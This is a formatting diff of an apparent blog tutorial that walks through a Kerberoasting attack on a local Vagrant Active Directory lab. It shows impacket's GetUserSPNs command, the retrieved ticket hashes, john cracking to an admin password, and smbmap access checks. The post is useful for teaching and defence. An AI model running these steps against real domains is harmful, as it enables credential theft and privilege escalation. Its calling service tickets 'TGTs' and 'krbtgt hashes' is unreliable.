@@ -16,21 +16,21 @@
 
 = Roasting Kerberos
 
-+Kerberos+ is a protocol developed by link:http://web.mit.edu/kerberos/[MIT]
+`Kerberos` is a protocol developed by link:http://web.mit.edu/kerberos/[MIT]
 used to authenticate network services.
 It is built using secret-key cryptography
 and uses a trusted third-party server
-called +Authentication Server+.
+called `Authentication Server`.
 This protocol authenticates users and services using tickets.
 When a client logs in their identity
-is authenticated via the +Authentication Server+ (+AS+).
-The AS then forwards the username to a +Key Distribution Center+ (+KDC+)
-that issues a +Ticket-Granting Ticket+ (+TGT+).
+is authenticated via the `Authentication Server` (`AS`).
+The AS then forwards the username to a `Key Distribution Center` (`KDC`)
+that issues a `Ticket-Granting Ticket` (`TGT`).
 this ticket is the user's proof of identity.
 
 This is how Kerberos protocol works:
 
-. A client sends a request to to the +AS+ soliciting a +TGT+.
+. A client sends a request to to the `AS` soliciting a `TGT`.
 This request is built using the machine computer time
 and encrypting it with the user's password hash.
 . Because the AD (Active Directory) has the user's password
@@ -39,13 +39,13 @@ the user's authentication data and respond back
 to the client with a TGT and a session key for the TGT.
 . Because the user now has a valid TGT for the domain,
 they can send a request for a service ticket.
-. Now the server verifies the validity of the +TGT+
+. Now the server verifies the validity of the `TGT`
 and responds back with the service ticket
 and a service session key.
 
-+Kerberoast+, discovered by link:https://twitter.com/TimMedin[Tim Medin],
-works by requesting Kerberos service tickets, +TGTs+,
-from the +Authentication Server+, +AS+,
+`Kerberoast`, discovered by link:https://twitter.com/TimMedin[Tim Medin],
+works by requesting Kerberos service tickets, `TGTs`,
+from the `Authentication Server`, `AS`,
 which is an action that any valid domain user can do.
 These service tickets are a hash
 that we can crack. We then have access to our target server
@@ -57,22 +57,22 @@ you need a valid domain user,
 so any employee of an organization can exploit this.
 If you are an anonymous attacker on the network,
 there are several ways to obtain user credentials.
-These include doing an +MDNS+ spoofing attack on the network
+These include doing an `MDNS` spoofing attack on the network
 (link:https://github.com/SpiderLabs/Responder[Responder]),
 an Evil Twin attack to the wireless network
 if they have enterprise security
 or a phishing email attack
-that uses an enterprise login with the +AD+, among others.
+that uses an enterprise login with the `AD`, among others.
 
 
 == Kerberoast lab
 
-To set up our lab we are going to use +Hashicorp's+ link:https://www.vagrantup.com/[Vagrant];
+To set up our lab we are going to use `Hashicorp's` link:https://www.vagrantup.com/[Vagrant];
 the source files are below.
-Create a folder with the name +kerberoast+
-and save the +Vagrantfile+ there.
-Also create another folder inside +kerberoast+ named +provision+
-and save the file +ad.ps1+ there.
+Create a folder with the name `kerberoast`
+and save the `Vagrantfile` there.
+Also create another folder inside `kerberoast` named `provision`
+and save the file `ad.ps1` there.
 
 .setting up the lab
 [source, bash, linenums]
@@ -122,14 +122,14 @@ Then run the environment using:
 kerberoast$ vagrant up
 ----
 
-This will create a +Windows+ machine
-with +Active Directory+ installed and configured.
+This will create a `Windows` machine
+with `Active Directory` installed and configured.
 At this point, everything we need has been completed
 and is ready for us to launch an attack.
 
 Now we can set up our attacking machine.
-Here we are using link:https://www.kali.org/[Kali Linux] with +Vagrant+ too,
-but you can use whatever +OS+ you prefer.
+Here we are using link:https://www.kali.org/[Kali Linux] with `Vagrant` too,
+but you can use whatever `OS` you prefer.
 
 These are the tools that we are going to use:
 
@@ -140,7 +140,7 @@ These are the tools that we are going to use:
 * link:https://github.com/danielmiessler/SecLists[SecLists]
 * link:https://github.com/magnumripper/JohnTheRipper[JohnTheRipper]
 
-If you are using +Kali+ the only thing that needs to be installed is +impacket+.
+If you are using `Kali` the only thing that needs to be installed is `impacket`.
 But first, we need to clone it.
 
 .cloning impacket
@@ -159,16 +159,16 @@ impacket$ pip install -r requirements.txt
 impacket$ python setup.py
 ----
 
-The +IP+ of our target server is +192.168.56.2+,
-the domain is +sky.net+
-and our low privilege domain credentials are +kertest:SuperSecure@123!!!+.
+The `IP` of our target server is `192.168.56.2`,
+the domain is `sky.net`
+and our low privilege domain credentials are `kertest:SuperSecure@123!!!`.
 
 We are ready to go.
 
 == Scanning our server
 
 First we need to check the server ports.
-We can use +nmap+ or +ncat+ to do it.
+We can use `nmap` or `ncat` to do it.
 
 .port scanning
 [source, bash, linenums]
@@ -207,12 +207,12 @@ PORT     STATE SERVICE
 (UNKNOWN) [192.168.56.2] 445 (microsoft-ds) open
 ----
 
-+Kerberos+ runs on +port 88+
-and +SMB+ runs on +port 445+;
+`Kerberos` runs on `port 88`
+and `SMB` runs on `port 445`;
 we are going to use these services
 to attack the Domain Controller.
 
-Then using +smbmap+ we can check our permissions on the server.
+Then using `smbmap` we can check our permissions on the server.
 
 .samba low privileges
 [source, bash]
@@ -241,7 +241,7 @@ but has no permissions on the server
 == Kerberoasting
 
 Given that we have an active user
-we can exploit +kerberoast+ to retrieve +TGTs+.
+we can exploit `kerberoast` to retrieve `TGTs`.
 This is done by simply running:
 
 .kerberoast attack
@@ -250,7 +250,7 @@ This is done by simply running:
 impacket/examples$ python GetUserSPNs.py sky.net/kertest -dc-ip 192.168.56.2 -save
 ----
 
-And when prompted put the password +SuperSecure@123!!!+.
+And when prompted put the password `SuperSecure@123!!!`.
 
 .kerberoast output
 [source, bash]
@@ -265,9 +265,9 @@ $krb5tgs$23$*kertest$SKY.NET$sky.net/kertest*$1639e200b950b6e566adad2ce3f3a336$b
 $krb5tgs$23$*svctest$SKY.NET$sky.net/svctest*$0fb0da3f22933a2893a6dac63e87538d$d11bb41bc5f41eeb4890ae74c42bff3ac203c649ef9740e70edb67113723df962b20c1346d82c7e410932944c881d3cb06a7cec0c21278ac1eeb2184867640f39b1ae725c02429ec9068fc6688102d576e4efb9c435f4207882601bff28414ababa2423cc4ea82d64082d8fe4eee797568dd514b4081a5338c08dd279fef2a3ade69efc2fe5502fd0a8e8cd8187761ff4c05322c00484e001832a28242d0c821ce44230eac54e2e4e36c365303ea729505ac9d35d7cc08077d07ea36c72e7ab12a04af392eeddcff37fd2e8a066e779ae26e0658ffa25f35a5c64f456a794676819dda35fe56514c1293f561750532d36a395069c8e98581f2b5d216254d7bed07e95dea36a4817ead880fe405711dae771e1660cadf3902fda1e0b730386aa02bc13bc8051ede7ee5388a919a4c20652ef241c47d66e21d026f5233bbd81dee6f01ad3887c32a9f4f0ab312939edcafa386eba04c32a0826f59b4009bd7fee5f6d78bcdeec80095fb1d0f189a87c26310b562bc4d94ffd19201a0bfa06a208d837a52bade076c2b34b8807f74bf51927b774e9f5047289d0d529beb58712d8eee673db3c77d28882a51bbfcf8dba96677af3b43a109c36b335b70dd0e316cce18877b7704e1ed837875cde1e7a462e35c9fe972318eb6d6d37ea222f00d5e81df343edfc1f50bd8907876c4dc1e77f01d9f5df3cb9e94f231a7a0eeb93aa62c22814742b06596eeb72824b4b0449cf6555fa020345bc21a84595437d50abb7cbe4287f580e47ed302faa9de47b68e9c3cab79ad2b1da17548f39aa8ace12372cb0d9952caee715535654f1f918ad5be3432b954bd7bae753152d919bcb93771fc9daf371ce724b18979f5180955d9ba6573d98f1042df80e5e7532fa96629e1b69f9e556df142fd8b0858243144c9f48a19d1933f280f8366c749fe6fb2b7b6c5f7781994f4d3f32552085ebc35ee4fa122a33978c32e877c0b48bc0cb19840bb7d349bbefb39ef1d062fc901b461a480e92e6121b3060f17c34fe92abad77ffebf687115da10b07081d35ef4a622916b656dd84c92643d477128d0a74a24ab23f69f61c94a7b0483313a31476cedc44a5c9efc55b18c57ebea38984f00e50d5773e25f7c6b3bcbc5ef73bf255ede5397ae334a72409440f8475b1f8b22730a456f81e6b08402c7c795aad026c01ca31b4fd8aac5bade44552787aec9c6b2407d2da24059014efdd88ee1953183f62b2e5e06ed7841438a7d4bd3635672b2
 ----
 
-Here we have our +TGTs+, they are +krbtgt hashes+,
-and there we can view another user on the server +svctest+.
-With this, we save that user's +TGT+ on a file.
+Here we have our `TGTs`, they are `krbtgt hashes`,
+and there we can view another user on the server `svctest`.
+With this, we save that user's `TGT` on a file.
 
 .save hash
 [source, bash]
@@ -275,8 +275,8 @@ With this, we save that user's +TGT+ on a file.
 echo '$krb5tgs$23$*svctest$SKY.NET$sky.net/svctest*$0fb0da3f22933a2893a6dac63e87538d$d11bb41bc5f41eeb4890ae74c42bff3ac203c649ef9740e70edb67113723df962b20c1346d82c7e410932944c881d3cb06a7cec0c21278ac1eeb2184867640f39b1ae725c02429ec9068fc6688102d576e4efb9c435f4207882601bff28414ababa2423cc4ea82d64082d8fe4eee797568dd514b4081a5338c08dd279fef2a3ade69efc2fe5502fd0a8e8cd8187761ff4c05322c00484e001832a28242d0c821ce44230eac54e2e4e36c365303ea729505ac9d35d7cc08077d07ea36c72e7ab12a04af392eeddcff37fd2e8a066e779ae26e0658ffa25f35a5c64f456a794676819dda35fe56514c1293f561750532d36a395069c8e98581f2b5d216254d7bed07e95dea36a4817ead880fe405711dae771e1660cadf3902fda1e0b730386aa02bc13bc8051ede7ee5388a919a4c20652ef241c47d66e21d026f5233bbd81dee6f01ad3887c32a9f4f0ab312939edcafa386eba04c32a0826f59b4009bd7fee5f6d78bcdeec80095fb1d0f189a87c26310b562bc4d94ffd19201a0bfa06a208d837a52bade076c2b34b8807f74bf51927b774e9f5047289d0d529beb58712d8eee673db3c77d28882a51bbfcf8dba96677af3b43a109c36b335b70dd0e316cce18877b7704e1ed837875cde1e7a462e35c9fe972318eb6d6d37ea222f00d5e81df343edfc1f50bd8907876c4dc1e77f01d9f5df3cb9e94f231a7a0eeb93aa62c22814742b06596eeb72824b4b0449cf6555fa020345bc21a84595437d50abb7cbe4287f580e47ed302faa9de47b68e9c3cab79ad2b1da17548f39aa8ace12372cb0d9952caee715535654f1f918ad5be3432b954bd7bae753152d919bcb93771fc9daf371ce724b18979f5180955d9ba6573d98f1042df80e5e7532fa96629e1b69f9e556df142fd8b0858243144c9f48a19d1933f280f8366c749fe6fb2b7b6c5f7781994f4d3f32552085ebc35ee4fa122a33978c32e877c0b48bc0cb19840bb7d349bbefb39ef1d062fc901b461a480e92e6121b3060f17c34fe92abad77ffebf687115da10b07081d35ef4a622916b656dd84c92643d477128d0a74a24ab23f69f61c94a7b0483313a31476cedc44a5c9efc55b18c57ebea38984f00e50d5773e25f7c6b3bcbc5ef73bf255ede5397ae334a72409440f8475b1f8b22730a456f81e6b08402c7c795aad026c01ca31b4fd8aac5bade44552787aec9c6b2407d2da24059014efdd88ee1953183f62b2e5e06ed7841438a7d4bd3635672b2' > hashkerber
 ----
 
-And then we crack it using +john+,
-a +SecLists+ dictionary, and +KoreLogic+ ruleset.
+And then we crack it using `john`,
+a `SecLists` dictionary, and `KoreLogic` ruleset.
 
 .john cracking
 [source, bash]
@@ -298,7 +298,7 @@ Session completed
 ----
 
 And it's cracked! Now we can check our access
-running +smbmap+ again with our new set of credentials.
+running `smbmap` again with our new set of credentials.
 
 .samba high privileges
 [source, bash]
@@ -323,15 +323,15 @@ $ smbmap -u svctest -p 'Monkey.123' -d sky.net -H 192.168.56.2
 ----
 
 As you can see, we now have administrative access on our server.
-You can access it by +RDP+ or retrieve files using +SMB+.
-Also, you can dump the +SAM+ to get more users and hashes,
-these last ones are +NTLMv1+ and easily cracked.
+You can access it by `RDP` or retrieve files using `SMB`.
+Also, you can dump the `SAM` to get more users and hashes,
+these last ones are `NTLMv1` and easily cracked.
 
 Here is the exploitation process.
 
-++++
+````
 <script id="asciicast-261241" src="https://asciinema.org/a/261241.js" async data-autoplay="true"  data-loop="true"></script>
-++++
+````
 
 === Solution
 
